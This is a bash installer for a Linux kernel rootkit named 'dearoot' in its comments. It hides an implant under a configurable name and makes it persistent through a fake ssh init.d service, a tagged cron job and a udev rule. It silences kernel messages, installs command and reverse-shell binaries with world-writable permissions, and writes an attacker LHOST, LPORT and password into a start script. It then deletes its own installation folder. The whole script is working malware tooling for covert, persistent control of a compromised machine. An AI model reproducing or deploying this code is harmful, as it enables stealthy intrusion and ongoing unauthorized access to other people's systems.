#!/bin/bash

PWD="$(cd "$(dirname $0)" && pwd)"
PERSISTENT_CMD="echo 123 > /tmp/3.txt" # replace here to autorun

source ".config" || \
{ echo "Error: no .config file found!"; exit; }

echo "kernel.printk = 3 3 3 3" >> /etc/sysctl.conf 1>/dev/null 2>/dev/null

######################################################
if [ "$PERSISTEN_METHOD"a = "service"a ]; then
	cat >> /etc/init.d/ssh$HIDE << EOF
#!/bin/bash 
### BEGIN INIT INFO
# Provides:          ssh
# Required-Start:
# Required-Stop:
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Start ssh$HIDE daemon at boot time
# Description:       Start ssh$HIDE daemon at boot time
### END INIT INFO
 
# chkconfig: - 90 10  
# description: test service  
# Source function library.  
. /etc/rc.d/init.d/functions  
  
# Source networking configuration.  
. /etc/sysconfig/network  
  
RETVAL=0  


# some operation doing when service start
start() {  
    echo "started"  
    REPLACE_HERE
}  
  
# some operation doing when service stop
stop() {  
    echo "stopped"  
}  
EOF
cat >> /etc/init.d/ssh$HIDE << "EOF"
# See how we were called.  
case "$1" in  
  start)  
        start  
        ;;  
  stop)  
        stop  
        ;;  
  restart|reload)  
        stop  
        start  
        RETVAL=$?  
        ;;  
  condrestart|try-restart|force-reload)  
        if [ -f /var/lock/subsys/$prog ]; then  
            stop  
            start  
            RETVAL=$?  
        fi  
        ;;  
  status)  
        echo "status"  
        RETVAL=1  
        ;;  
  *)  
        echo $"Usage: $0 {start|stop|restart|try-restart|force-reload|status}"  
        exit 1  
esac  
  
exit $RETVAL  
EOF
	# sed -i s/"REPLACE_HERE"/"$PERSISTENT_CMD"/g /etc/init.d/sshreptile
	sed -i 's?REPLACE_HERE?'"$PERSISTENT_CMD"'?g' /etc/init.d/ssh$HIDE
	chmod +x /etc/init.d/ssh$HIDE
	update-rc.d ssh$HIDE defaults 1>/dev/null 2>/dev/null
	update-rc.d ssh$HIDE start 20 1 2 3 4 5 . stop 60 0 6 . 1>/dev/null 2>/dev/null

	chkconfig --add ssh$HIDE 1>/dev/null 2>/dev/null 
	chkconfig ssh$HIDE on 1>/dev/null 2>/dev/null
fi

###############################################
if [ "$PERSISTEN_METHOD"a = "cron"a ]; then
	crontab -l > confx 2>/dev/null
	cat >> confx << "EOF"
#<osuai>
* * * * * REPLACE_HERE
#</osuai>
EOF
	# sed -i s/"osuai"/$TAG_NAME/g confx
	sed -i 's?osuai?'"$TAG_NAME"'?g' confx
	# sed -i s/"REPLACE_HERE"/"$PERSISTENT_CMD"/g confx
	sed -i 's?REPLACE_HERE?'"$PERSISTENT_CMD"'?g' confx
	crontab confx && rm -f confx
fi

###############################################

function random_gen_dec {
	RETVAL=$(shuf -i 50-99 -n 1)
}


UDEV_DIR=/lib/udev
random_gen_dec && NAME=$RETVAL-$HIDE.rules
RULE=/lib/udev/rules.d/$NAME
[ ! -d /lib/udev/rules.d ] && RULE=/etc/udev/rules.d/$NAME

# Create dearoot's folder
mkdir -p /$HIDE && \

# Copy "cmd" binary
cp $PWD/cmd /$HIDE/$HIDE"_cmd" && \

# Copy "shell" binary
cp $PWD/shell /$HIDE/$HIDE"_shell" && \

# Copy "bashrc"
cp $PWD/bashrc /$HIDE/$HIDE"_rc" && \

# Create start script
cp $PWD/start /$HIDE/$HIDE"_start" && \
sed -i s!XXXXX!$TAG_NAME! /$HIDE/$HIDE"_start" && \
sed -i s!\#CMD!/$HIDE/$HIDE"_cmd"! /$HIDE/$HIDE"_start" && \
if [ "$CONFIG_RSHELL_ON_START" == "y" ]; then
	sed -i s!\#SHELL!/$HIDE/$HIDE"_shell"! /$HIDE/$HIDE"_start" && \
	sed -i s!LHOST!$LHOST! /$HIDE/$HIDE"_start" && \
	sed -i s!LPORT!$LPORT! /$HIDE/$HIDE"_start" && \
	sed -i s!PASS!$PASSWORD! /$HIDE/$HIDE"_start" && \
	sed -i s!INTERVAL!$INTERVAL! /$HIDE/$HIDE"_start" && \
	true || false;
fi

# Permissions
chmod 777 /$HIDE/* && \

# Copy kernel implant
cp $PWD/$HIDE /$HIDE/$HIDE && \

# Make persistent
cp $PWD/$HIDE $UDEV_DIR/$HIDE && \

echo -n 'ACTION=="add", ENV{MAJOR}=="1", ENV{MINOR}=="8", RUN+="/lib/udev/'$HIDE'"' > $RULE \

#cp $PWD/rule $RULE && \

# cleaning output dir
rm -rf $PWD \
# Load dearoot
/$HIDE/$HIDE && \

echo -e "\n\e[44;01;33m*** DONE! ***\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }

# How to Uninstall
echo -e "UNINSTALL:\n"
echo -e "/$HIDE/$HIDE""_cmd show"
echo -e "rmmod dearoot_module"
echo -e "rm -rf /$HIDE $RULE $UDEV_DIR/$HIDE"
echo

